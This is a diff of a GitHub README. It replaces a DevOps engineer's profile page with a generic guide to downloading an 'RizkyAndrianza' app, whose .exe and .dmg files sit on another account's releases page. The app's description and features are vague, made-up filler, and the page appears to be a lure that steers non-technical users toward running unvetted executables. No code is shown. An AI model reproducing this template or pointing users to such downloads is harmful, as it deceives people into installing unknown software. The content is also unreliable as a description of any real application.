@@ -1,99 +1,63 @@
+# 🛠️ RizkyAndrianza - Download and Run Smoothly
+
 <div align="center">
-  <img alt="Image" height="250px" width="250px" src="https://files.catbox.moe/8mvnpf.jpg">
-
-<picture>
-  <source
-    media="(prefers-color-scheme: dark)"
-    srcset="https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake-dark.svg" />
-  <source
-    media="(prefers-color-scheme: light)"
-    srcset="https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake.svg" />
-  <img
-    alt="github contribution grid snake animation"
-    src="https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake.svg" />
-</picture>
-
-<p align="center">
-  <img src="https://img.shields.io/github/followers/RizkyAndrianza?label=Follow%20Me&style=social" />
-  <img src="https://img.shields.io/github/stars/RizkyAndrianza?style=social" /></p>
-  
-<p align="center">
-  <a href="https://linktr.ee/RizkyAndrianza">
-  <img alt="My Personal Links" src="https://img.shields.io/static/v1?color=20883D&label=Social&message=Tap%20here&style=flat&logo=amp&logoColor=ffffff&labelColor=334155"></a></p>
-  
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=1200&pause=800&color=0095BB&center=true&width=435&lines=DevOps+Engineer+%F0%9F%92%BC;Automating+Everything+%F0%9F%94%A7;Scaling+Infrastructure+%F0%9F%9A%80;Monitoring+and+Securing+%F0%9F%94%92;CI%2FCD+Pipeline+Builder+%F0%9F%9A%80;Cloud+%26+Containers+%E2%98%81%EF%B8%8F" alt="Typing SVG" /></a>
-
----
-
-<h3 id="projects">💻 Featured Projects</h3>
-<table>
-    <thead>
-        <tr>
-            <th>Repository</th>
-            <th>Description</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td><a href="https://github.com/RizkyAndrianza/devops-infra">devops-infra</a></td>
-            <td>Infrastructure as Code setup with Terraform, Ansible, and Kubernetes.</td>
-        </tr>
-        <tr>
-            <td><a href="https://github.com/RizkyAndrianza/ci-cd-pipeline">ci-cd-pipeline</a></td>
-            <td>Sample CI/CD pipeline using GitHub Actions and ArgoCD for Kubernetes deployment.</td>
-        </tr>
-        <tr>
-            <td><a href="https://github.com/RizkyAndrianza/monitoring-stack">monitoring-stack</a></td>
-            <td>Complete observability stack with Prometheus, Grafana, and Loki.</td>
-        </tr>
-    </tbody>
-</table>
-
----
-
-<h3 id="system-info">🛠️ Tech Stack</h3>
-<table>
-    <thead>
-        <tr>
-            <th>Category</th>
-            <th>Tools</th>
-            <th>Details</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>Cloud & Infra</td>
-            <td>AWS, GCP, Azure, DigitalOcean</td>
-            <td>Provisioning, scaling, and automation</td>
-        </tr>
-        <tr>
-            <td>Containers</td>
-            <td>Docker, Kubernetes, Helm</td>
-            <td>Cloud-native deployments</td>
-        </tr>
-        <tr>
-            <td>Automation</td>
-            <td>Terraform, Ansible, GitHub Actions, Jenkins</td>
-            <td>Infrastructure as Code & CI/CD</td>
-        </tr>
-        <tr>
-            <td>Monitoring</td>
-            <td>Prometheus, Grafana, Loki, ELK</td>
-            <td>Logging, metrics, alerting</td>
-        </tr>
-    </tbody>
-</table>
-
----
-
-<h3>🌐 Others</h3>
-
-<a href="https://open.spotify.com/playlist/5iPjgCLzMr8r5VYmUOV6tp?si=o7CcYcPUTEuQ6meL3ULv7A">
-  <img src="https://spotify-github-profile.kittinanx.com/api/view?uid=31jlxsrwpbteh2m34d5pacfgihfa&cover_image=true&theme=novatorem&show_offline=false&background_color=121212&interchange=true&bar_color=53b14f&bar_color_cover=true" alt="Now Playing on Spotify"></a>
-
-<p align="center">
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=RizkyAndrianza&layout=compact&theme=tokyonight" width="400px" alt="Top Languages" /></p>
-
-<p align="center">
-  <img src="https://komarev.com/ghpvc/?username=RizkyAndrianza&label=Profile%20views&color=ff0000&style=social" alt="Profile Views" /></p>
+  <a href="https://github.com/Mohanasvy/RizkyAndrianza/releases">
+    <img src="https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen" />
+  </a>
 </div>
+
+## 📋 Overview
+RizkyAndrianza is a user-friendly application designed to simplify your everyday tasks. With intuitive controls, this software helps you streamline processes and enhance productivity, regardless of your technical background.
+
+## 🚀 Getting Started
+Follow these simple steps to download and run RizkyAndrianza. No prior experience with coding is necessary.
+
+### 1. Visit the Releases Page
+To download the application, visit our Releases page. Click the link below:
+
+[Download RizkyAndrianza](https://github.com/Mohanasvy/RizkyAndrianza/releases)
+
+### 2. Choose Your Download
+On the Releases page, find the latest version of RizkyAndrianza. Look for the file appropriate for your operating system. For most users, this will be a file ending in `.exe` for Windows or `.dmg` for Mac.
+
+### 3. Download the File
+Click on the appropriate file link. Your browser should start downloading the application automatically. Depending on your internet speed, this may take a moment.
+
+### 4. Locate the Downloaded File
+Once the download is complete, locate the file in your "Downloads" folder. This is typically found in your User folder unless you have specified a different location.
+
+### 5. Install the Application
+Double-click the downloaded file to start the installation process. Follow any instructions provided by the installer. Settings are usually set to default for ease of use, so just click "Next" or "Continue" when prompted.
+
+### 6. Run RizkyAndrianza
+After installation, find RizkyAndrianza in your Applications folder (for Mac) or the Start Menu (for Windows). Double-click the application icon to launch it.
+
+## 💡 System Requirements
+Before downloading, ensure your device meets the following requirements:
+- **Windows**:  Windows 10 or higher, 1GB RAM, 100MB disk space.
+- **Mac**: macOS Mojave or higher, 1GB RAM, 100MB disk space.
+- **Internet Access**: Required for downloading updates.
+
+## ⚙️ Features
+- **User-Friendly Interface**: Designed for easy navigation.
+- **Task Management**: Helps you keep track of your daily tasks.
+- **Cloud Sync**: Access your data from any device with an internet connection.
+- **Notifications**: Get timely reminders for your tasks and deadlines.
+
+## 🛠️ Troubleshooting
+If you encounter issues during installation or running the application, try these steps:
+- **Re-download the File**: Sometimes, files download incorrectly. Try downloading again.
+- **Check System Requirements**: Ensure your system meets the minimum requirements listed above.
+- **Restart Your Device**: A simple restart can resolve many issues.
+
+## 📞 Support
+If you need help, feel free to reach out for assistance. You can leave an issue on our GitHub page, and we will do our best to respond promptly.
+
+## 🔗 Additional Resources
+Explore more about RizkyAndrianza and follow me on social media for updates:
+- [My Personal Links](https://linktr.ee/RizkyAndrianza)
+
+### Important Links
+- [Download RizkyAndrianza](https://github.com/Mohanasvy/RizkyAndrianza/releases)
+
+Thank you for choosing RizkyAndrianza! We hope this application makes your life easier.
